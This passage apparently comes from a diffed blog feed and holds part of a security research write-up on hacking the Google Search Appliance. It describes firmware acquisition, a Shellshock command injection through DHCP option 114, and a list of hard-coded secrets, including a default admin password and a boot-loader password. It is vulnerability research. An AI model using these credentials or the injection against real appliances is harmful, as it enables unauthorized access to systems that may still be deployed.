+  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=un01LMLMuis&quot;&gt;https://www.youtube.com/watch?v=un01LMLMuis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=K-sEER8CK0U&quot;&gt;https://www.youtube.com/watch?v=K-sEER8CK0U&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&quot;&gt;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>[REL] A Journey Into Hacking Google Search Appliance</title>
+   <link href="https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/"/>
+   <updated>2023-07-07T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;GSA Admin console post-authentication Remote Code Execution.&lt;/li&gt;
+  &lt;li&gt;GSA Search interface Path traversal.&lt;/li&gt;
+  &lt;li&gt;GSA uses Oracle’s Outside-in Technology to convert documents.&lt;/li&gt;
+  &lt;li&gt;Google Web services have some fixed URIs that provide information about the service itself.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information. Around 2005, Google introduced the Google Mini for personal and small business use. Later, at the end of 2008, a virtual machine version was launched, called the Virtual Google Search Appliance (hereinafter referred to as VGSA). However, at the end of 2018, Google ended the life cycle of the GSA product and integrated it into the Cloud Search product line.&lt;/p&gt;
+
+&lt;h3 id=&quot;appliance-and-software-acquisition&quot;&gt;Appliance and Software Acquisition&lt;/h3&gt;
+
+&lt;p&gt;We managed to purchase a device by searching “Google Search Appliance” on eBay.&lt;/p&gt;
+
+&lt;p&gt;Luckily, the first one we bought was a GSA with unerased data:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Even now, you can still find devices that are currently being sold.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On the other hand, The original public link of vGSA has been removed.
+http://dl.google.com/vgsa/vgsa_20090210.7z [removed]
+http://dl.google.com/vgsa/vgsa_20081028.7z [removed]&lt;/p&gt;
+
+&lt;p&gt;We found the file on BitTorrent magnet link:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, found the link to the old version software from Google Groups:
+https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The link was:&lt;/p&gt;
+
+&lt;p&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin [removed]&lt;/p&gt;
+
+&lt;p&gt;And we can obtain all version number from:
+&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Guessing the File Naming Rules as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install_bundle-10000(3-digit numbers)-7.(numbers).(numbers)-(numbers).bin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;And write a shell script to attempt downloading software:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Including the information found through internet search, successfully retrieved the following file:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
+all_langs-lang-pack-2.2-1.bin
+centos_patch_files-6.0.0-22.bin
+centos_patch_files-6.14.0-28.bin
+centos_patch_files-7.0.14-238.bin
+centos_patch_files-7.2.0-252.bin
+centos_patch_files-7.2.0-264.bin
+centos_patch_files-7.2.0-270.bin
+centos_patch_files-7.2.0-280.bin
+centos_patch_files-7.2.0-286.bin
+install_bundle-10000653-7.2.0-252.bin
+install_bundle-10000658-7.2.0-264.bin
+install_bundle-10000661-7.2.0-270.bin
+install_bundle-10000681-7.4.0-64.bin
+install_bundle-10000685-7.4.0-72.bin
+install_bundle-10000686-7.4.0-74.bin
+install_bundle-10000692-7.4.0-82.bin
+install_bundle-10000762-7.6.0-36.bin
+install_bundle-10000767-7.6.0-42.bin
+install_bundle-10000772-7.6.0-46.bin
+install_bundle-10000781-7.6.0-58.bin
+install_bundle-10000810-7.6.50-30.bin
+install_bundle-10000822-7.6.50-36.bin
+install_bundle-10000855-7.6.50-64.bin
+install_bundle-10000878-7.6.250-12.bin
+install_bundle-10000888-7.6.250-20.bin
+install_bundle-10000901-7.6.250-26.bin
+install_bundle-10000915-7.6.360-10.bin
+install_bundle-10000926-7.6.360-16.bin
+install_bundle-10000967-7.6.512-18.bin
+sw_files-5.0.4-22.bin
+sw_files-6.14.0-28.bin
+sw_files-7.0.14-238.bin
+vm_patch_1_for_504_G22_and_G24_only.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;
+
+&lt;p&gt;Next, we began research on vGSA. By default, after importing the virtual machine, 
+this system only provides a function for network configuration and doesn’t provide a system shell for operation or use.
+However, because the virtual machine operates within ours own environment,
+it is usually possible to obtain system permissions through the following methods:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Directly altering unencrypted disk files&lt;/li&gt;
+  &lt;li&gt;Modifying the virtual machine memory&lt;/li&gt;
+  &lt;li&gt;Booting using CDs or disks from another operating system&lt;/li&gt;
+  &lt;li&gt;Exploiting known vulnerabilities&lt;/li&gt;
+  &lt;li&gt;Utilizing hard-coded administrator or system account passwords&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The following image shows the network configuration screen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;
+
+&lt;p&gt;When testing early Linux appliances and servers, especially those using the RedHat series operating system, 
+there are often Shellshock vulnerabilities, and the 2008 released vGSA is no exception.
+Inserting option 114 in the DHCP server will be set in the environment variable, 
+thereby triggering the vulnerability and executing any command.&lt;/p&gt;
+
+&lt;p&gt;The command attempted to be inserted is: 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;. 
+This command can be observed to be executed repeatedly, as error messages continue to appear in the console output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;vgsa-operation-system-observation&quot;&gt;vGSA operation system observation&lt;/h4&gt;
+
+&lt;p&gt;After successfully obtaining operating system privileges,
+we can observe the network environment, 
+the running applications, and the file system.
+Here are some insights gained from observing the operating system environment:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Version number is 5.2.0.G.27.&lt;/li&gt;
+  &lt;li&gt;Services are mainly written in C/C++, Java, Python.&lt;/li&gt;
+  &lt;li&gt;/export/hda3 seems to be the directory primarily used by the service.&lt;/li&gt;
+  &lt;li&gt;/etc/shadow contains the root account with password hash x███████████M.&lt;/li&gt;
+  &lt;li&gt;Administration interface listening on port 8000, 8443 with default admin password, j0njlRXpU5CQ.&lt;/li&gt;
+  &lt;li&gt;/.gnupg contains ent_box_key public and private keys.&lt;/li&gt;
+  &lt;li&gt;/.gnupg contains google_license_key public key.&lt;/li&gt;
+  &lt;li&gt;/.ssh/authorized_keys contains two sets of public keys.&lt;/li&gt;
+  &lt;li&gt;/root/.ssh/authorized_keys contains one set of public keys.&lt;/li&gt;
+  &lt;li&gt;/root/.ssh/ contains two sets of SSH public and private keys.&lt;/li&gt;
+  &lt;li&gt;/root/.gnupg/ contains ent_box_key public and private keys.&lt;/li&gt;
+  &lt;li&gt;Oracle’s Outside In Technology is used to convert documents into HTML web pages.&lt;/li&gt;
+  &lt;li&gt;The Java runtime environment uses a Security Manager for protection.&lt;/li&gt;
+  &lt;li&gt;The request for engineer support function uses ppp to build a virtual private network, /etc/ppp/chap-secrets contains account passwords ( z██████c、]███████T  ).&lt;/li&gt;
+  &lt;li&gt;The boot menu password in /etc/lilo.conf is cmBalx7.&lt;/li&gt;
+  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric has a string that seems to be used for symmetric encryption.&lt;/li&gt;
+  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd contains two sets of username-password combinations ( admin： M█████████████████████████w=:9██=  google：w█████████████████████████o=:N██= ).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Executable programs with network services are as follows:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Listen Port&lt;/th&gt;
+      &lt;th&gt;Process Name&lt;/th&gt;
+      &lt;th&gt;Program Language&lt;/th&gt;
+      &lt;th&gt;Function&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;ssh&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;OpenSSH Server&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;53&lt;/td&gt;
+      &lt;td&gt;named&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;Bind Named&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;953&lt;/td&gt;
+      &lt;td&gt;named&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;Bind Named&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1111&lt;/td&gt;
+      &lt;td&gt;webserver_config&lt;/td&gt;
+      &lt;td&gt;python&lt;/td&gt;
+      &lt;td&gt;Installer&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2100&lt;/td&gt;
+      &lt;td&gt;adminrunner.py&lt;/td&gt;
+      &lt;td&gt;python&lt;/td&gt;
+      &lt;td&gt;admin console backend&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3990&lt;/td&gt;
+      &lt;td&gt;monitor&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;monitor&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4000&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4430&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;admin console frontend&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4911&lt;/td&gt;
+      &lt;td&gt;borgmon&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;borgmon&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4916&lt;/td&gt;
+      &lt;td&gt;reactor&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5000&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5600&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;6600&lt;/td&gt;
+      &lt;td&gt;cacheserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7800&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;admin console frontend (http)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7880&lt;/td&gt;
+      &lt;td&gt;TableServer&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7882&lt;/td&gt;
+      &lt;td&gt;AuthzChecker&lt;/td&gt;
+      &lt;td&gt;Java (without security manager)&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7886&lt;/td&gt;
+      &lt;td&gt;tomcat&lt;/td&gt;
+      &lt;td&gt;Java&lt;/td&gt;
+      &lt;td&gt;tomcat server&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8000&lt;/td&gt;
+      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
+      &lt;td&gt;Java (without security manager)&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8443&lt;/td&gt;
+      &lt;td&gt;stunnel&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;redirect http to https&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8888&lt;/td&gt;
+      &lt;td&gt;GWS&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9300&lt;/td&gt;
+      &lt;td&gt;oneboxserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9328&lt;/td&gt;
+      &lt;td&gt;entspellmixer&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9400&lt;/td&gt;
+      &lt;td&gt;mixserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9402&lt;/td&gt;
+      &lt;td&gt;mixserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9448&lt;/td&gt;
+      &lt;td&gt;qrewrite&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9450&lt;/td&gt;
+      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
+      &lt;td&gt;Java (without security manager )&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10094&lt;/td&gt;
+      &lt;td&gt;enterprise_onebox&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10200&lt;/td&gt;
+      &lt;td&gt;clustering_server&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;11913&lt;/td&gt;
+      &lt;td&gt;sessionmanager&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;12345&lt;/td&gt;
+      &lt;td&gt;RegistryServer&lt;/td&gt;
+      &lt;td&gt;Java (without security manager)&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19780&lt;/td&gt;
+      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
+      &lt;td&gt;python&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19900&lt;/td&gt;
+      &lt;td&gt;feedergate&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;extract, transform and feed records&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;21200&lt;/td&gt;
+      &lt;td&gt;FileSystemGateway&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;31300&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Despite the presence of so many services, most connections are blocked by iptables. 
+The following are the iptables settings:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
